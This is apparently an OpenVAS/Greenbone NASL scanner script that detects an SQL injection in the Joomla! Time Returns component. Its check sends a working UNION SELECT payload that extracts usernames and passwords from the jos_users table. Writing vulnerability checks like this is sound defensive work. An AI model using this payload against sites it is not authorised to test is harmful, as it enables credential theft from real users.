# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902584");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Joomla! Time Returns Component 'id' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46267");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50026");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17944");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/105619/joomlatimereturns-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to cause SQL Injection attack and
gain sensitive information.");

  script_tag(name:"affected", value:"Joomla! Time Returns Component Version 2.0");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
'id' parameter to index.php (when 'option' is set to 'com_timereturns' and 'view' is set to 'timereturns'), which
allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla! Time Returns component is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_timereturns&view=timereturns&id=7+" +
            "union+all+select+concat_ws(0x6f7674657374,0x3a,username,0x3a," +
            "password,0x3a,0x6f7674657374),2,3,4,5,6+from+jos_users--";

if (http_vuln_check(port:port, url:url, pattern:'ovtest:.*:.*:ovtest', check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
